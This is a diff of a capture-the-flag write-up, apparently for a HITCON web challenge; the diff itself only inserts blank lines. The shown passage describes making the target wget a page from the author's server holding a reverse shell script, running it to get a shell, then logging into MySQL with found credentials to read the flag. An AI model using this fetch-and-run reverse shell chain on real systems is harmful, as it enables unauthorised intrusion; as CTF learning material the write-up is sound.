@@ -22,12 +22,15 @@ rm o*
 ```
 
 and then `sh .a`
+
 it will `wget kaibro.tw`
+
 and download the `index.html`
 
 we can put reverse shell script into index.html on my server
 
 `sh i*`
+
 then we got reverse shell
 
 
@@ -39,8 +42,11 @@ fl4444g / SugZXUtgeJ52_Bvr
 
 
 $ mysql -u fl4444g -p
+
 Enter password: SugZXUtgeJ52_Bvr
+
 use fl4gdb;
+
 select * from this_is_the_fl4g;
 
 `hitcon{idea_from_phith0n,thank_you:)}`
